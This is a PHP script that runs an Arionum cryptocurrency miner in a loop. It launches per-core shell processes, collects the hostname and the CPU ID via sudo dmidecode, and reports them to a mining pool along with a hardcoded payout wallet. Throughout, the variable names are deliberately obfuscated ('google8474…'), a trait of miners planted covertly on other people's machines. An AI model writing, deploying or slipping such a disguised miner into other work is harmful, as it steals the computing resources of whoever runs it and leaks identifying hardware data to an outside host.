<?php

while (1) {

include "./process.php";

$res = "http://mine.arionumpool.com/mine.php?q=info";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $res);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$res8474747474747474 = curl_exec($ch);
curl_close($ch);

$info = json_decode($res8474747474747474, true);
$data = $info['data'];
$block = $data['block'];
$difficulty = $data['difficulty'];
$publickey = $data['public_key'];
$height = $data['height'];
$limit = $data['limit'];
$argonmemory = $data['argon_mem'];
$argonthreads = $data['argon_threads'];
$argontime = $data['argon_time'];
$nonce = base64_encode(openssl_random_pseudo_bytes(32));
$nonce = preg_replace("/[^a-zA-Z0-9]/", "", $nonce);
$base = $publickey."-".$nonce."-".$block."-".$difficulty;

?>

<?php

$google844444744474 = preg_replace("/\s+/","",shell_exec("nproc"));

$google8474747474 = "0";

$google84747474744474 = "1";

for ($i = 0; $i < $google844444744474; $i++) {

$google8474747474++;

$google84747474744474++;

?>

<?php

if(preg_match("/1/",$argonthreads))

{

$google84 = shell_exec("sleep " . $google8474747474 . ";bash ./process" . $google8474747474 . ".sh start");

echo "$google84";

}

?>

<?php

}

?>

<?php

$google844444744474 = preg_replace("/\s+/","",shell_exec("nproc"));

$google844444744474444474 = $google844444744474 / $argonthreads;

$google8474747474 = "0";

$google84747474744474 = "1";

for ($i = 0; $i < $google844444744474444474; $i++) {

$google8474747474++;

$google84747474744474++;

?>

<?php

if(preg_match("/4/",$argonthreads))

{

$google84 = shell_exec("bash ./process" . $google8474747474 . ".sh start");

echo "$google84";

}

?>

<?php

}

?>

<?php

$google844444744474 = preg_replace("/\s+/","",shell_exec("nproc"));

echo "$google844444744474 $argonthreads";

$google844444744474444474 = $google844444744474 / $argonthreads;

$google84444474447444444444444474 = $google844444744474 - $google844444744474444474;

$google844444744474444444444444744444444474 = $google844444744474 - $google84444474447444444444444474;

$google8474747474 = "0";

$google847474747444741274744474 = "$google844444744474444444444444744444444474";

for ($i = 0; $i < $google84444474447444444444444474; $i++) {

$google8474747474++;

$google847474747444741274744474++;

?>

<?php

if(preg_match("/4/",$argonthreads))

{

$google84 = shell_exec("bash ./process" . $google847474747444741274744474 . ".sh stop");

echo "$google84";

}

?>

<?php

}

?>

<?php

$google8474747474 = "0";

$google844444744474 = preg_replace("/\s+/","",shell_exec("nproc"));

$google84747474747474 = array();

for ($i = 0; $i < $google844444744474; $i++) {

$google8474747474++;

$google84747474747474[] = file_get_contents("./hashrate$google8474747474.sh");

}

$google844444744444744444444474 = array_sum($google84747474747474);

$google847474747474747474744444444474 = shell_exec("hostname");

$google84747474747474747474444444447444444474 = shell_exec("sudo dmidecode -t 4 | grep ID | sed 's/.*ID://;s/ //g'");

$id = rawurlencode($google84747474747474747474444444447444444474);

$worker = rawurlencode($google847474747474747474744444444474);

$address = rawurlencode("Uku3sSxk77eYKyRdg6z7k9iPeRtr6cZJkywFmcXR1BxMkCVfGmVWsD5AFgQJi4Z8xPVfFkzwx7ir6WtPcN2BYtj");

$miner = rawurlencode("4");

$hrgpu = rawurlencode("0");

$hashrate = preg_replace("/(.*)\.(.*)/","$1",$google844444744444744444444474);

$extra = "&id=$id&worker=$worker&address=$address&hashrate=$hashrate&miner=$miner&hrgpu=$hrgpu";

$res8474 = file_get_contents("http://mine.arionumpool.com/mine.php?q=info".$extra);

echo "$res8474";

?>

<?php

}

?>

